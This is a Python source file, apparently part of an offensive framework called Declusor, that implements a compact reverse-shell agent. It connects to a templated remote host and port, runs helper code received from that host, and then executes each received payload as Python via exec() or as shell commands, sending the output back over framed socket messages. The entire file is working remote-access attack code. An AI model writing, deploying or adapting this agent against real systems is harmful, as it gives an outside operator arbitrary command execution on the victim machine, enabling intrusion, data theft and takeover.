#!/usr/bin/env python3
"""Declusor py_socket compact reverse-shell agent."""

import io
import socket
import struct
import subprocess
import sys

HOST = "$HOST"
PORT = int("$PORT")
ACKNOWLEDGE = bytes.fromhex("$ACKNOWLEDGE")

_SESSION_SCOPE: dict = {"__name__": "__declusor__"}


def _read_exact(sock: socket.socket, length: int) -> bytes | None:
    buf = bytearray()
    while len(buf) < length:
        chunk = sock.recv(length - len(buf))
        if not chunk:
            return None
        buf.extend(chunk)
    return bytes(buf)


def _read_frame(sock: socket.socket) -> bytes | None:
    header = _read_exact(sock, 5)
    if header is None:
        return None
    _, length = struct.unpack(">BI", header)
    return _read_exact(sock, length)


def _send_frame(sock: socket.socket, channel: int, data: bytes) -> None:
    sock.sendall(struct.pack(">BI", channel, len(data)) + data)


def _is_python(code: str) -> bool:
    stripped = code.strip()
    if not stripped:
        return True
    first = stripped.splitlines()[0].strip()
    if first.startswith("#!"):
        return "python" in first.lower()

    in_doc = False
    delim = ""
    keywords = (
        "import ", "from ", "def ", "class ", "with ", "try:",
        "for ", "while ", "if ", "async ", "print(", "exec(", "eval(",
        "raise ", "assert ", "return ",
    )
    for line in code.splitlines():
        line = line.strip()
        if not line:
            continue
        if in_doc:
            if delim in line:
                in_doc = False
            continue
        if line.startswith(('"""', "'''")):
            delim = line[:3]
            if line.count(delim) < 2:
                in_doc = True
            continue
        if line.startswith("#"):
            continue
        if any(line.startswith(kw) for kw in keywords):
            return True
        if any(line.startswith(fn + "(") for fn in _SESSION_SCOPE):
            return True
        return False
    return False


def _execute(payload: str, sock: socket.socket) -> None:
    if _is_python(payload):
        buf = io.StringIO()
        old_out, old_err = sys.stdout, sys.stderr
        exit_code = 0
        try:
            sys.stdout = sys.stderr = buf
            exec(payload, _SESSION_SCOPE)  # noqa: S102
        except SystemExit as exc:
            code = exc.code
            exit_code = int(code) if isinstance(code, int) else (0 if code is None else 1)
            buf.write(f"[py_socket error] SystemExit: {exc}\n")
        except Exception as exc:
            buf.write(f"[py_socket error] {type(exc).__name__}: {exc}\n")
            exit_code = 1
        finally:
            sys.stdout, sys.stderr = old_out, old_err

        output = buf.getvalue().encode(errors="replace")
        if output:
            _send_frame(sock, 1, output)
        _send_frame(sock, 0, struct.pack(">i", exit_code))
    else:
        proc = subprocess.Popen(payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # noqa: S602
        while proc.stdout:
            chunk = proc.stdout.read(4096)
            if not chunk:
                break
            _send_frame(sock, 1, chunk)
        proc.wait()
        _send_frame(sock, 0, struct.pack(">i", proc.returncode))


def main() -> None:
    with socket.create_connection((HOST, PORT)) as sock:
        helpers_bytes = _read_frame(sock)
        if helpers_bytes:
            try:
                exec(helpers_bytes.decode(errors="replace"), _SESSION_SCOPE)  # noqa: S102
            except (Exception, SystemExit):
                pass
        sock.sendall(ACKNOWLEDGE)
        while (payload_bytes := _read_frame(sock)) is not None:
            _execute(payload_bytes.decode(errors="replace"), sock)


if __name__ == "__main__":
    main()
